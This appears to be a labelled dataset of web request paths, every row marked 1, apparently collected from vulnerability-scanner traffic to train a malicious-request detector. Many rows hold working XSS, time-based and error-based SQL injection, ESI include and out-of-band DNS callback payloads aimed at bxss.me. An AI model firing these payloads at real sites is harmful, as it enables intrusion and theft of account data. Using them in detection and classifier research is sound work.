sentences	labels
module/**********/visit.jsp?i_columnid=1&i_webid[0]=exp&i_webid[1]==extractvalue(1,concat(char(126),md5(1602390990)))&type=1 	 1
video/****/?app=article&view=item31ab2"">alert(777)0ccba&id=186 	 1
synr/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
images/***//xfs.bxss.me.css 	 1
index/******/2015/04/30/011702718.shtml 	 1
command/***/anonymous<script>alert(777)</script>test.jsp 	 1
qhly/******/2011/03/04/javascript:window.close(); 	 1
xq/***/javascript:void(0); 	 1
system/********/interview/room.jsp?wbinterviewid=1033' or 0024=0024 and '1'='1&owner=1707212448 	 1
inc/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') and 2510=8916  	 1
wp-content/*******/admin-menu-editor/menu-editor.php 	 1
art/*******/t/xss.html? 	 1
qhly/******/2017/03/31/javascript:dozoom(9) 	 1
index/******/2008/11/14/002633410.shtml 	 1
was5/***/search?searchword=1&channelid=287219 if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&perpage=24&templet=1&token=1 	 1
images/*/jquery.ellipsis.js/<img src="javascript:alert(30)"> 	 1
2017zt/******/2019/08/05/javascript:void(0); 	 1
xwzx/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 1
search/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 1
zmhd/*****//xfs.bxss.me/zmhdyc.html 	 1
xxgk/******/list.html?new=bxss.me 	 1
zwgk/******/fdzdgknr/qtfdxx<esi:include src=""http://bxss.me/rpb.png""/>/ 	 1
qhly/******/2021/11/29/javascript:dozoom(14) 	 1
2017zt/******/2017/11/08/javascript:void(0); 	 1
qtyz/*****/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 1
xxgk/******/gzzexxpl/javascript:stranbody(); 	 1
xinanyanjiu/************/0'xor(if(now()=sysdate(),sleep(3),0))xor'z/ 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(749)</script>?_=1630311587779 	 1
news/********/zijinqudao?page=1 and 0830=0830 	 1
index/******/2021/11/20/javascript:void(); 	 1
system/********/js' and 2*3*8=6*8 and 'vofh'='vofh/jquery/jquery-latest.min.js 	 1
xwzx/****/javascript:stranbody(); 	 1
com1/*****/dash_status.php?status_data[1]=alert(777); 	 1
lz/******/2021/03/18/javascript:void(0); 	 1
xwzx/****/2021_jtyw/202109/ 	 1
news/**************/romania 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1*/-->'""></iframe></script></style></title></textarea><script >alert(33844)</script>&token=1 	 1
index/******/2021/12/19/javascript:void(0); 	 1
brp/*****/xxappportalindex.z?appuser=51216 	 1
jsearchfront/template'""()&%<acx><script >s7rq(9026)</script>/****/110105008056111/16/images/view.js 	 1
was5/***/search?page=2&channelid=253477&searchword=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
xwzx/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
images/*/slick.min.js/<img src="javascript:alert(20)"> 	 1
ldzc/*****/202005/t20200511_163094.html?leader=∫ŒºÃœ»<esi:include src=""http://bxss.me/rpb.png""/> 	 1
com1/*******/diary/new/submit.php 	 1
xxgk/******/zyrsbd/ and 1>1 	 1
xxgk/*******/bxss.me/list.html 	 1
dcwj/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
2016zt/******/2017/03/05/javascript:void(); 	 1
was5/***/search?channelid=299868&perpage=1000%') and 2750=5343  	 1
vc/**/widgets/hanweb/iconfont'||'/css/iconfont.css 	 1
col/****/index.html/""><script>alert(342)</script> 	 1
zwgk/****/bmyjs/\"javascript:void(0)\" 	 1
zfld/******/2021/09/07/013446963'"/>//</script//>//<svg/onload=alert(1549) width=100///>.shtml 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(3710)">?_=1630312015742 	 1
was5/***/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(58818)</script> 	 1
xxgk/******/list.html?new=bxss.me 	 1
index/*****/lists/cate_id/166.html?page=2'and'l'='l 	 1
qhly/******/2007/06/14/javascript:window.close(); 	 1
newscenter/******/2020/04/24/javascript:window.print() 	 1
system/********/js'||'/vsb_news_search.js 	 1
zwgk/******/ncwywfgz/if(now()=sysdate(),sleep(12),0)/yzq/xmb_gzdxb.htm 	 1
pic/*/00/74/17/741735_259107.jpg 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24') and 5314=3656 and ('1'='1&searchword=1 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(978)">?_=1630311679312 	 1
news/********/silujiaoyu?*/-->'""></iframe></script></style></title></textarea><script >alert(75996)</script>=1 	 1
con/****/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> 	 1
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/bzxajgc/szss/plx.htm 	 1
module/********/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc' and 9123=9123 and 'kxyi'='kxyi 	 1
newscenter/******/2017/10/18/012442898.shtml?url_type=39&object_type=webpage&pos=1 	 1
icons/********/index.jsp?locale=""><script>alert(777)</script> 	 1
ldzc/*****/201611/t20161129_78963.html?leader=Œ¬–Ò∂´'""()&%<acx><script >room(9327)</script> 	 1
system/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/**/base64.js 	 1
gjcp/*****/edit.php?menu="">pt>alert(777); script>pt> 	 1
en/***********/rdandmanufacture/201412/t20141210_22173.html' and 'x'='x 	 1
qhly/******/2021/12/13/javascript:dozoom(12) 	 1
2021zt/******/2021/06/09/013399706'""/><img src=x onerror=alert(2324)>.shtml 	 1
news/********/yidaiyiluwenda?page=1 and 2158=2158-- 	 1
socket.gethostbyname(""hitle"" ""kcqepxlh7dfb3.bxss.me."")[3].to_s) ""/****/7/12/art_35_234319.html 	 1
cgi-bin/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(1027)">?_=1630311706240 	 1
index/******/2021/11/12/javascript:void(); 	 1
index.php/****/mytag_j.php?aid=6022 	 1
system/********/storage/localupload.jsp?doaction=save and if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798 	 1
gjjtwzq/****/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> 	 1
/***********/ui/lib/jquery/jquery.min.js 	 1
en/*******/?site="">alert(777); 	 1
col/******/http://bxss.me/t/fit.txt.html 	 1
index/******/2021/12/16/javascript:void(0); 	 1
ztpd/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
vc/**/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/security/crypto-js.js 	 1
demo/http://*******/t/fit.txt?.jpg/demo11.html 	 1
swld/******/2021/12/19/javascript:window.close(); 	 1
vc"" and 2*3*8=6*8 and ""837p""=""837p/**/lib/easyui/themes/bootstrap/window.css 	 1
'.gethostbyname(lc('hitum'.'nsbkdczq3dd58.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(117).chr(79).chr(111).chr(90).'/****/202103/t20210303_2614145.html 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24&templet=1' or 7583=4017  	 1
es/******/common/newaccount.aspx?ddlculture=alert(777) 	 1
z/http://*******/t/xss.html? 	 1
swld/******/2021/11/13/javascript:window.print() 	 1
socket.gethostbyname('hitev' 'ybtblhdkd8b81.bxss.me.')[3].to_s) '/**/widgets/scrollup/js/jquery.scrollup.min.js 	 1
qhly/******/2017/03/21/javascript:window.close(); 	 1
images/*********/ 	 1
zwgk/******/ncwywfgz/szss/plq/xmb_gzdxb' and 2*3*8=6*8 and 'kghj'='kghj.htm 	 1
jsearchfront//***********/jcse/110105008056111/16/images/style.css 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 1050=2295  	 1
synr/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
zwgk/******/ncwywfgz/zws%' and 2*3*8=6*8 and 'ikkt'!='ikkt%/yzq/xmb_gzdxb.htm 	 1
zxgg/********/javascript:void(0); 	 1
zwgk/******/rsrm' and 2*3*8=6*8 and 'je60'='je60/1.htm 	 1
synr/*****/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user 	 1
system%' and 2*3*8=6*8 and 'egwj'!='egwj%/********/js/newcalendar/config.js 	 1
/***********/wdsjs/hfswsj/ 	 1
news/********/guojialingdaoren?page=1</script><script>l452(9168)</script> 	 1
xxgk/******/tjj/zfxxgkml_/xfs.bxss.me/xwfbh_2065/list.html 	 1
zwgk/****/http://bxss.me/t/fit.txt/gdyx/ 	 1
zwgk/****/bmyjs/zzqzfzcbmyzstsjg/zzqwsjkwyh/zzqwsjsw/\"javascript:void(0)\" 	 1
include/******/channel/dage.php 	 1
xq/*******/gvideos.php?gid=1 and 1=1 	 1
vc/**/lib/easyui"" and 2*3*8=6*8 and ""ytlf""=""ytlf/plugins/jquery.panel.js 	 1
pic/*/11/04/19/11041901_705855.jpg 	 1
newscenter/******/2012/12/07/010972251.shtml 	 1
lz/******/2021/04/25/javascript:void(0); 	 1
module/if(now()=sysdate(),sleep(15),0)/*****/theme/default/css/jpage.css 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(436)</script>?_=1630311406219 	 1
ldzc/*******/201610/t20161016_531.html 	 1
system/********/swf/flowplayer.commercial.swf 	 1
xxgk/******/tjj/zfxxgkml_http://bxss.me/t/xss.html? 	 1
2021zt/******/javascript:alert(2698)/013399706.shtml 	 1
module/***/rssfeed.jsp?colid=34') and 5048=1574 and ('xrko'='xrko 	 1
fxgg/********/javascript:void(0); 	 1
zwgk/*******/zfxxgkzd/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 1
es/****/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> 	 1
newscenter/******/2021/12/16/javascript:void(); 	 1
module/********/downfile.jsp?classid=0&filename=72a64bf486d74bca8643c56c4ce11e27.doc%' and 2*3*8=6*8 and 'qab7'!='qab7% 	 1
ztpd/************/xyddhlzzwn/javascript:void(0); 	 1
jsearchfront/**********/autocomplete.do?begin=1&end=1&eq=1&oq=1&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=1&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111 	 1
jsearchfront/**********/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pos=filenumber&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111 	 1
newscenter/******/2021/04/04/javascript:window.print() 	 1
jsearchfront/********/jcse/110105008056111/16/images/jquery.autocomplete.js/"><script>alert(2149)</script> 	 1
vc/**/lib"" and 2*3*8=6*8 and ""yq4z""=""yq4z/security/sm2_util.js 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/waterpull/bxss.me.js 	 1
newscenter/******/2011/12/10/javascript:window.close() 	 1
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/zjdt/gzdt/144.htm 	 1
images"" and 2*3*8=6*8 and ""td8g""=""td8g/*/hanweb.min.css 	 1
vc/**/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/easyui/plugins/jquery.draggable.js 	 1
qhly/******/2017/04/18/javascript:dozoom(14) 	 1
brp/***/worktable/oaurl.z?userno=51216&moduleid=1487877924 	 1
index/******/2021/11/03/javascript:window.print() 	 1
2016zt/******/2020/11/23/javascript:window.close(); 	 1
news/**************/geogia 	 1
ru/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 1
xwzx/if(now()=sysdate(),sleep(15),0)/2021_mtgz/******/t20210505_273338.html 	 1
0'xor(if(now()=sysdate(),sleep(18),0))xor'z/**************/2017-02-16/221.html 	 1
vc/**/css'||'/global.css 	 1
jsearchfront/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16<esi:include src=""http://*******/rpb.png""/>&websiteid=110105008056111 	 1
jsearchfront/********/jcse/110105008056111/16/images/mypagination/jquery.mypagination6.0.js/<img src="javascript:alert(2165)"> 	 1
icons/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
kjcx/****/ and 1=1 	 1
lz/******/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
news/********/silutouzi?page='""()&%<acx><script >z9xk(9907)</script> 	 1
system/resource%' and 2*3*8=6*8 and '2ajq'!='2ajq%/**/jquery/jquery-latest.min.js 	 1
templates/********/index.aspx?nodeid=394 and 4736=4736 	 1
zzsl/******/202108/encodeuricomponent(window.location.href) 	 1
xxgk/*****/1088/1091/list.html?new=bxss.me 	 1
kefuzhongxin/common-problem/****/0""xor(if(now()=sysdate(),sleep(9),0))xor""z-02-15/406.html 	 1
js/****/tipsloginsubmit.action 	 1
flash/*************/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24' or 5273=6063 /*&templet=1&token=1 	 1
system/********/js' and 2*3*8=6*8 and 'edk5'='edk5/newcalendar/my97datepicker.htm 	 1
lz/******/2021/04/13/javascript:void(0); 	 1
fr/****/search.php?query=""onmouseover=""alert(1); 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/widgets/scrollup/css/themes/image.css 	 1
lz/*************/ajax_managed_services.php 	 1
qhly/******/2009/06/04/javascript:window.print() 	 1
lz/********/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(340)">?_=1630311367886 	 1
zwgk/****/202109/encodeuricomponent(window.location.href) 	 1
prn/***/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 1
2017zt/******/2017/10/27/javascript:window.close(); 	 1
swld/******/2021/09/04/javascript:window.close(); 	 1
was5/***/search?searchword=1&channelid=287219%') or 1023=0133 and '%'='&perpage=24&templet=1&token=1 	 1
ztpd/********/index.jsp?locale=""><script>alert(777)</script> 	 1
jsearchfront'||'/********/jcse/110105008056111/16/images/hanweb.css 	 1
was5/***/search?channelid=299868&perpage=1000%') and 8001=8001  	 1
ztpd/******/javascript:void(0); 	 1
ztsj/**/yqfkzccs/dsjzccs/wzszc/\"javascript:void(0)\" 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 9362=6961 and ('1'='1 	 1
gjcp/********/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 	 1
art/****/4/15/art_34_229168.html 	 1
xwzx/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
ldzc/****/202001/t20200119_'.gethostbyname(lc('hitgk'.'uulengzi91143.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(86).chr(120).chr(80).'.html 	 1
vc/**/interface/visit.jsp?i_articleid=0&i_columnid=1&i_webid=1&type=1&url[0]=exp'and/**/extractvalue(1,concat(char(126),md5(1902681869)))and'&url[1]==1 	 1
include/******/new.lib.php 	 1
news/********/zijinqudao?page=*/-->'""></iframe></script></style></title></textarea><script >alert(54810)</script> 	 1
xxgk/******/lzyj<esi:include src=""http://bxss.me/rpb.png""/>/ 	 1
qhly/******/2007/03/12/javascript:dozoom(14) 	 1
module/***/bxss.me/theme/default/css/jpage.css 	 1
index/******/2021/12/04/javascript:void(0); 	 1
newscenter/******/2014/11/11/011551628.shtml 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/********/show.do 	 1
xwzx/mtgz' and 2*3*8=6*8 and 'prja'='prja/2021_mtgz/******/t20210712_310551.html 	 1
module/***/jpage%' and 2*3*8=6*8 and 'aako'!='aako%/theme/simple/css/jpage.css 	 1
zwgk/****/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqhlsdlptcyygwh/\"javascript:void(0)\" 	 1
2017zt/******/2019/08/22/javascript:window.close(); 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(691)</script>?_=1630311553645 	 1
ztzl/******/djbn_gjjs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
jsearchfront/********/jcse/http://bxss.me/t/fit.txt/16/images/plugin/mainframe/spellcheck.js 	 1
lcgg/********/javascript:void(0); 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/index.html 	 1
xxgk/zfwjn' and 2*3*8=6*8 and 'stsr'='stsr/****/1081/list.html 	 1
2016zt/******/2016/11/03/javascript:window.close(); 	 1
zwgk/****/znjs'||'.htm 	 1
le-buzios/**/wenlan.php 	 1
art/****/7/12/art_35_http://bxss.me/t/xss.html? 	 1
synr/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
zzsl/******/encodeuricomponent(window.location.href) 	 1
xxgk/******/tjj/zfxxgkml_2127/jytabljg_http://bxss.me/t/xss.html? 	 1
xinanyanjiu/************/guzhiqihuo%' and 2*3*8=6*8 and 'uary'!='uary%/ 	 1
xwzx/****/jt16/javascript:stranbody(); 	 1
xxgk/******/zfczyjs/list.html?new="".gethostbyname(lc(""hitle"".""pbdompeld594a.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(106).chr(76).chr(116).chr(72)."" 	 1
xwdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/zcwj/1.htm 	 1
newscenter/******/2021/11/20/javascript:window.print() 	 1
xwzx/****/jt17_6388/javascript:stranbody(); 	 1
xq/******/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 1
gjcp/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 1
jsearchfront/********/jcse/http://bxss.me/t/fit.txt?.jpg/16/images/plugin/mainframe/spellcheck.js 	 1
lz/******/2021/10/22/javascript:void(0); 	 1
rssdy/****/?app=article&view=item31ab2"">alert(777)0ccba&id=186 	 1
wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?calendar_id=1' and 1=dbms_pipe.receive_message(7d,15) and '1'='1&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &wpml_lang=&year=2018 	 1
en/*****/goods' and 2*3*8=6*8 and '667d'='667d/cate_id/179.html 	 1
news/********/:'""()&%<acx><script >dgy2(9961)</script> 	 1
/***********/xxgknb/2013/list.html 	 1
news/********/silushangji?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(23026)</script> 	 1
ldzc/****/swsj/201610/t20161010_456.html?leader=À’æ˝<esi:include src=""http://bxss.me/rpb.png""/> 	 1
en/***********/finance/202101/t20210129_269909.html" and "x"="y 	 1
was5/***/search?page=2&channelid=253477&searchword=1' and 4058=6841  	 1
ywzzq/******/common/signin.aspx?cbautosignin=""alert(777) 	 1
qhly/******/2021/11/13/javascript:window.print() 	 1
zwgk/****/bmjs/zzqfyxt/zwszjrmfy/\"javascript:void(0)\" 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/voice/voicerecorder.js/"><script>alert(4694)</script> 	 1
ldzc/*****/201610/t20161016_541.html?leader="".gethostbyname(lc(""hitxl"".""prxxhvkmc2121.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(99).chr(74).chr(100).chr(75)."" 	 1
module/***/jpage//xfs.bxss.me/default/css/jpage.css 	 1
zwgk/****/201809/t20180929_1087289.html 	 1
wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1&day=1' and 1=dbms_pipe.receive_message(7d,15) and '1'='1&month=5&pag=1&year=2018 	 1
ztzl/****/messages/outbox.php?f=social"" onmouseover=""confirm(777) 	 1
zwgk/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/ysjs/1.htm 	 1
ldzc/*****/201611/t20161129_78963.html?leader=Œ¬–Ò∂´<esi:include src=""http://bxss.me/rpb.png""/> 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(852)</script>?_=1630311614072 	 1
socket.gethostbyname('hitkd' 'xctfnpesd64db.bxss.me.')[3].to_s) '/****/110105008056111/16/images/result.css 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 1043=9126  	 1
vc/**/lib/easyui' and 2*3*8=6*8 and 'y0dy'='y0dy/plugins/jquery.linkbutton.js 	 1
ztsj/**/2020jgnb/ 	 1
lcgg/********/javascript:void(0); 	 1
wp-content/*******/slidedeck2/js/zeroclipboard/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height 	 1
2016zt/******/2017/08/01/javascript:void(0); 	 1
images/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
vc/**/lib/easyui/http://bxss.me/t/fit.txt/bootstrap/messager.css 	 1
zwgk/zdlygk'||'/**********/wzs/zcwj.htm 	 1
xxgk/******/cl/javascript:void(0); 	 1
jsearchfront/http://*******/t/fit.txt?.jpg/jcse/110105008056111/16/images/main.css 	 1
xxgk/******/tjj/zfxxgkml_2127/jgzn_2042/list'||'.html 	 1
socket.gethostbyname(""hitoz"" ""opfdmtji04ff5.bxss.me."")[3].to_s) ""/**/11/art_34_242320.html 	 1
lxwm/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 1
2020zt/******/"><script>alert(53)</script> 	 1
qhly/******/2018/08/22/javascript:dozoom(9) 	 1
wp-content/*******/nextgen-gallery/xml/media-rss.php?mode=<script>alert(uvhumk1v)</script> 	 1
ztpd/******/2021/10/30/javascript:void(0); 	 1
z/191211'""()&%<acx><script >br7s(9343)</script>-8/*****/d7c921b2c59d284228d4f6d2d18d0cae.css 	 1
zwgk/****/bmyjs/zzqzfzcbmyzstsjg/zzqybj/\"javascript:void(0)\" 	 1
qhly/******/2008/01/04/javascript:window.close(); 	 1
xq/******/count/ 	 1
outurl/*******/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
zfld/******/2021/11/19/javascript:window.close(); 	 1
newscenter/******/2021/11/22/javascript:void(0); 	 1
lxwm/*****/dash_additem.php?additem_form=alert(777); 	 1
addins/****/ajax/schoollist.ashx?areaid=-2 	 1
jsearchfront/template'""()&%<acx><script >qamc(9308)</script>/****/110105008056111/16/images/main.css 	 1
art/****/10/http://bxss.me/t/fit.txt?.jpg/art_31_242050.html 	 1
/***********/czgk/bmjs/gdyx/ 	 1
qtyz/*********/admin/notificationpopup.php?new=1&type=cr&height=alert(777) 	 1
wp-content/*******/wp-soononline-page/error-log.php 	 1
